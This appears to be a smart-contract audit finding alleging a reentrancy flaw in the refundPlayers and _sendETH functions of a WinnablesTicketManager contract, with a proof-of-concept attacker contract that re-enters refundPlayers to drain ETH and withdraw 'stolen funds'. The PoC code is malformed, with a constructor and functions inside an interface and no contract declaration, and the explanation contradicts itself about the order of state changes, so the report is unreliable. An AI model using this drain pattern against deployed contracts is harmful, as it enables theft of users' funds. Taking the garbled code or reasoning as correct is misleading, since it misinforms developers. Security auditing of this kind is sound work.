# Reentrancy Risk in refundPlayers and _sendETH function at WinnablesTicketManager contract

### Summary

The refundPlayers function and _sendETH function use low-level calls to send ETH:

solidity
```solidity
function _sendETH(uint256 amount, address to) internal {
    if (amount == 0) revert NothingToSend();
    (bool success, ) = to.call{ value: amount }("");
    if (!success) revert ETHTransferFail();
}
```
In refundPlayers, ETH is sent to the player using _sendETH, which in turn uses a low-level call. This opens up the potential for reentrancy attacks if the player address is a contract that can perform a reentrant call to the refundPlayers function or other vulnerable functions.

pragma solidity ^0.8.24;

interface IVulnerableContract {
    function refundPlayers(address player) external;

    constructor(address _vulnerableContract) {
        vulnerableContract = IVulnerableContract(_vulnerableContract);
    }

    // Fallback function to be called during reentrancy
    receive() external payable {
        // Re-enter the vulnerable contract to exploit the reentrancy
        if (address(vulnerableContract).balance > 0) {
            vulnerableContract.refundPlayers(address(this));
        }
    }

    // Start the attack
    function attack() external payable {
        require(msg.value > 0, "Send ETH to attack");
        vulnerableContract.refundPlayers(address(this));
    }

    // Withdraw function to retrieve stolen funds
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

```
**Explanation**
**Vulnerable Contract:**

refundPlayers: This function updates the refund amount and then calls _sendETH to transfer ETH. This ordering allows for reentrancy attacks because it first sets refunds[player] to 0 but calls _sendETH before completing the refund process.
_sendETH: Transfers ETH to the player using a low-level call (call{value: amount}("")), which allows the attacker to execute arbitrary code in their fallback function.
**Attacker Contract:**

receive: This fallback function is called when the attacker contract receives ETH. It re-enters the refundPlayers function of the vulnerable contract to exploit the reentrancy vulnerability.
attack: Starts the attack by initiating a refund request. If the contract receives ETH, it will repeatedly exploit the vulnerability via the fallback function.
withdraw: Allows the attacker to withdraw the stolen funds from the attacker contract.
**Testing**
Deploy the Vulnerable Contract: Deploy the VulnerableContract on a test network.
Deposit ETH: Send some ETH to the VulnerableContract to make sure it has a balance.
Deploy the Attacker Contract: Deploy the ReentrancyAttacker contract with the address of the VulnerableContract.
Execute Attack: Call the attack function of the ReentrancyAttacker with some ETH to start the attack.
Withdraw Funds: After the attack, call withdraw on the ReentrancyAttacker to retrieve stolen funds.
This PoC demonstrates how reentrancy can be exploited through a vulnerable refund mechanism by exploiting the ordering of state changes and external calls.

### Mitigation

Consider using the transfer function instead of low-level calls for sending ETH to avoid reentrancy issues.
Apply the Checks-Effects-Interactions pattern to mitigate reentrancy by updating internal states before making external calls.
